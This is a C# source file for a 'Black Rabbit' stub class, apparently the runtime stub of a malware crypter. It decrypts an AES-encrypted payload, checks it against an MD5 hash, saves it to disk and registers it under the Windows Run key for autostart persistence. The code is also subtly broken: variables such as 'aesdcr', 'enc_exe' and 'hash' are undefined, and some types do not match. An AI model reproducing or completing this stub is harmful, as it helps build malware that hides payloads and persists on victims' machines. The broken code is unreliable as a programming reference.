using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using Microsoft.Win32;

/// <summary>
/// Black Rabbit Stub Class
/// </summary>
public class brstub
{
    //variables

    byte[] decrypted;

    public byte[] Decrypted { get => decrypted; }

    enum regKeyType
    {
        CurrentUser,
        LocalMachine
    }

    //PRIVATE METHODS

    private static string GetMd5Hash(MD5 md5Hash, string input)
    {

        // Convert the input string to a byte array and compute the hash.
        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

        // Create a new Stringbuilder to collect the bytes
        // and create a string.
        StringBuilder sBuilder = new StringBuilder();

        // Loop through each byte of the hashed data 
        // and format each one as a hexadecimal string.
        for (int i = 0; i < data.Length; i++)
        {
            sBuilder.Append(data[i].ToString("x2"));
        }

        // Return the hexadecimal string.
        return sBuilder.ToString();
    }

    //PUBLIC METHODS


    /// <summary>
    /// Encrypt file with random key and IV.
    /// </summary>
    /// <param name="file">File as byte array.</param>
    /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=key, Item3=IV </returns>
    public Tuple<byte[], byte[], byte[]> encrypt(byte[] file)
    {
        byte[] encrypted;
        byte[] key;
        byte[] IV;

        using (Aes aesecr = Aes.Create())
        {

            aesdcr.BlockSize = 128;
            aesdcr.KeySize = 256;
            aesdcr.Mode = CipherMode.CBC;

            aesecr.Key = aesecr.GenerateKey;
            aesecr.GenerateIV();

            key = aesecr.Key;
            IV = aesecr.IV;



            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (var swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(file);
                    }
                    encrypted = msEncrypt.ToArray();
                }
            }
        }
        return new Tuple<byte[], byte[], byte[]>(encrypted, key, IV);
    }

    /// <summary>
    /// Encrypt file with user set key and random IV.
    /// </summary>
    /// <param name="file">File as byte array.</param>
    /// <param name="IV">IV as byte array.</param>
    /// <returns>Returns tuple: Item1=encrypted file as byte array, Item2=IV </returns>
    public Tuple<byte[], byte[]> encrypt(byte[] file, byte[] key)
    {
        byte[] encrypted;
        byte[] IV;

        using (Aes aesecr = Aes.Create())
        {

            aesdcr.BlockSize = 128;
            aesdcr.KeySize = 256;
            aesdcr.Mode = CipherMode.CBC;

            aesecr.Key = key;
            aesecr.GenerateIV();

            IV = aesecr.IV;



            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (var swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(file);
                    }
                    encrypted = msEncrypt.ToArray();
                }
            }
        }
        return new Tuple<byte[], byte[]>(encrypted, IV);
    }

    /// <summary>
    /// Encrypt file with user set key and IV
    /// </summary>
    /// <param name="file">>File as byte array.</param>
    /// <param name="key">Key as byte array.</param>
    /// <param name="IV">IV as byte array.</param>
    /// <returns></returns>
    public byte[] encrypt(byte[] file, byte[] key, byte[] IV)
    {
        byte[] encrypted;


        using (Aes aesecr = Aes.Create())
        {

            aesdcr.BlockSize = 128;
            aesdcr.KeySize = 256;
            aesdcr.Mode = CipherMode.CBC;

            aesecr.Key = key;
            aesecr.IV = IV;


            var encryptor = aesecr.CreateEncryptor(aesecr.Key, aesecr.IV);

            // Create the streams used for encryption. 
            using (var msEncrypt = new MemoryStream())
            {
                using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                {
                    using (var swEncrypt = new StreamWriter(csEncrypt))
                    {
                        //Write all data to the stream.
                        swEncrypt.Write(file);
                    }
                    encrypted = msEncrypt.ToArray();
                }
            }
        }
        return encrypted;
    }


    /// <summary>
    /// Decrypt file.
    /// </summary>
    /// <param name="encFile">Encrypted file as byte array.</param>
    /// <param name="key">Key as byte array.</param>
    /// <param name="IV">IV as byte array.</param>
    /// <returns>Byte array of decrypted file.</returns>
    public byte[] decrypt(byte[] encFile, byte[] key, byte[] IV)
    {

        
        using (Aes aesdcr = Aes.Create())
        {
            aesdcr.BlockSize = 128;
            aesdcr.KeySize = 256;
            aesdcr.Mode = CipherMode.CBC;
    

            aesdcr.Key = key;
            aesdcr.IV = IV;

            ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);

            using (var msDecrypt = new MemoryStream(enc_exe))
            {
                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var srDecrypt = new StreamReader(csDecrypt))
                    {

                        // Read the decrypted bytes from the decrypting stream
                        // and place them in a string.
                        decrypted = srDecrypt.ReadToEnd();
                    }
                }
            }
        }

        return decrypted;
    }

    
    /// <summary>
    /// Check's decrypted file is correct.
    /// </summary>
    /// <param name="hashMD5">This is hash require to compare with decrypted file hash.</param>
    /// <returns>Return true if hashes are  same, false if hashes are different.</returns>
    public bool checkMD5(string hashMD5)
    {
        using ( MD5 md5Hash = MD5.Create())
        {
            // Hash the input.
            string hashOfInput = GetMd5Hash(md5Hash,decrypted);

            // Create a StringComparer an compare the hashes.
            StringComparer comparer = StringComparer.OrdinalIgnoreCase;

            if (0 == comparer.Compare(hashOfInput, hash)) return true;
            
            else return false;
        }
    }

    /// <summary>
    /// Save decrypted array to file
    /// </summary>
    /// <param name="path">Path to save file</param>
    /// <returns>Return true if file's exist ,false if isn't exist.</returns>
    
    public bool saveFile(string path )
    {
        File.WriteAllBytes(path, decrypted);

        if (File.Exists(path)) return true;
        else return false;
    }

    /// <summary>
    /// Add seved file to autostart register.
    /// </summary>
    /// <param name="appName">App name in name field in register.</param>
    /// <param name="path">Path to file to autostart.</param>
    /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
    /// <returns></returns>
    public void addToReg(string appName, string path, regKeyType regKey)
    {
        RegistryKey rkApp;

        if (regKey == regKeyType.CurrentUser)
        {
            rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }
        else if(regKey == regKeyType.LocalMachine)
        {
            rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }
        rkApp.SetValue(appName, path);
        rkApp.Close();
    }
    
}
